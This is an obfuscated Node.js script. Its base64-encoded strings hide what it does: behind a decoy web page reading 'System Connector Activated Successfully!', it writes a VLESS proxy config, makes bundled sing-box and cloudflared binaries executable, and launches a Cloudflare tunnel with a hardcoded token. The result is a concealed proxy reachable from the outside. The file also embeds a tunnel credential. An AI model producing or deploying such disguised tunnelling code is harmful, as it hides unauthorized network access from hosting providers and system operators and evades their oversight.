const _0x12a3 = function(_0xidx) {
    const _0xarr = [
        'ZnM=', 'aHR0cA==', 'Y2hpbGRfcHJvY2Vzcw==', 'c3Bhd24=', 'ZXhlY1N5bmM=',
        'MmMxMWJkZTAtZmEwNi00NDM4LTlmZjAtZjg1MDJmYWY2YWEz',
        'ZXlKaElqb2lOMkZoT1dObVlURmtNRFZpT0dZd01qWTROemN3TnpSa056Qms2akkzTVRnaUxDSjBJam9pT0dVME9EUDRPR1l0T1ROa01pMDBaVEZpTFRrNFptWXRPVGMwWkdKaE1qTmxZemt6SWl3aWNYSWpPaUpaVUVNclRWRmRlRkY2VmtSamRFMXRWVUpXUXcwTlRreVdFUndORVZXZEhwek5EZ0daRWMxVG1WMyJ9',
        'L3ZsZXNz', 'Li9zaW5nLWJveA==', 'Li9jbG91ZGZsYXJlZA==', 'Li9jb25maWcuanNvbg==',
        'Q29udGVudC1UeXBl', 'dGV4dC9wbGFpbjsgY2hhcnNldD11dGYtOA==',
        'U3lzdGVtIENvbm5lY3RvciBBY3RpdmF0ZWQgU3VjY2Vzc2Z1bGx5IQ==', 'bG9n', 'bGV2ZWw=',
        'aW5mbw==', 'dGltZXN0YW1w', 'aW5ib3VuZHM=', 'dHlwZQ==', 'dmxlc3M=', 'dGFn',
        'dmxlc3MtaW4=', 'bGlzdGVu', 'MTI3LjAuMC4x', 'bGlzdGVuX3BvcnQ=', 'dXNlcnM=',
        'dXVpZA==', 'Zmxvdw==', 'dHJhbnNwb3J0', 'd3M=', 'cGF0aA==', 'b3V0Ym91bmRz',
        'ZGlyZWN0', 'Y2htb2QgK3ggLi9zaW5nLWJveCAuL2Nsb3VkZmxhcmVk', 'cnVu', 'LWM=',
        'dHVubmVs', 'LS1uby1hdXRvdXBkYXRl', 'LS10b2tlbg==', 'aW5oZXJpdA==', 'U0lHSU5U',
        'U0lHVEVSTQ==', 'Y3JlYXRlU2VydmVy', 'd3JpdGVIZWFk', 'ZW5k', 'bGlzdGVu', 'd3JpdGVGaWxlU3luYw=='
    ];
    return Buffer.from(_0xarr[_0xidx], 'base64').toString('utf8');
};

const _0x3ea1 = require(_0x12a3(0));
const _0x5b3c = require(_0x12a3(1));
const _0x29fd = require(_0x12a3(2));
const _0xsp = _0x29fd[_0x12a3(3)];
const _0xex = _0x29fd[_0x12a3(4)];

const _0xid = _0x12a3(5);
const _0xtk = _0x12a3(6);
const _0xpt = 2020 * 4;
const _0xws = _0x12a3(7);

const _0xwebP = process.env.PORT || _0xpt;
_0x5b3c[_0x12a3(43)]((_0xreq, _0xres) => {
    _0xreq;
    const _0xheaders = {};
    _0xheaders[_0x12a3(11)] = _0x12a3(12);
    _0xres[_0x12a3(44)](200, _0xheaders);
    _0xres[_0x12a3(45)](_0x12a3(13));
})[_0x12a3(46)](_0xwebP);

async function _0xinit() {
    const _0xsb_path = _0x12a3(8);
    const _0xcf_path = _0x12a3(9);
    const _0xcfg_path = _0x12a3(10);

    const _config_obj = {};
    _config_obj[_0x12a3(14)] = {};
    _config_obj[_0x12a3(14)][_0x12a3(15)] = _0x12a3(16);
    _config_obj[_0x12a3(14)][_0x12a3(17)] = true;

    const _inbound = {};
    _inbound[_0x12a3(19)] = _0x12a3(20);
    _inbound[_0x12a3(21)] = _0x12a3(22);
    _inbound[_0x12a3(23)] = _0x12a3(24);
    _inbound[_0x12a3(25)] = _0xpt;

    const _user = {};
    _user[_0x12a3(27)] = _0xid;
    _user[_0x12a3(28)] = "";
    _inbound[_0x12a3(26)] = [_user];

    _inbound[_0x12a3(29)] = {};
    _inbound[_0x12a3(29)][_0x12a3(19)] = _0x12a3(30);
    _inbound[_0x12a3(29)][_0x12a3(31)] = _0xws;

    _config_obj[_0x12a3(18)] = [_inbound];

    const _outbound = {};
    _outbound[_0x12a3(19)] = _0x12a3(33);
    _outbound[_0x12a3(21)] = _0x12a3(33);
    _config_obj[_0x12a3(32)] = [_outbound];

    _0x3ea1[_0x12a3(47)](_0xcfg_path, JSON.stringify(_config_obj, null, 2));

    try {
        _0xex(_0x12a3(34));
    } catch (_err) {}

    const _process1 = _0xsp(_0xsb_path, [_0x12a3(35), _0x12a3(36), _0xcfg_path], { stdio: _0x12a3(40) });
    const _process2 = _0xsp(_0xcf_path, [_0x12a3(37), _0x12a3(38), _0x12a3(35), _0x12a3(39), _0xtk], { stdio: _0x12a3(40) });

    process.on(_0x12a3(41), () => { _process1.kill(); _process2.kill(); process.exit(); });
    process.on(_0x12a3(42), () => { _process1.kill(); _process2.kill(); process.exit(); });
}

_0xinit();
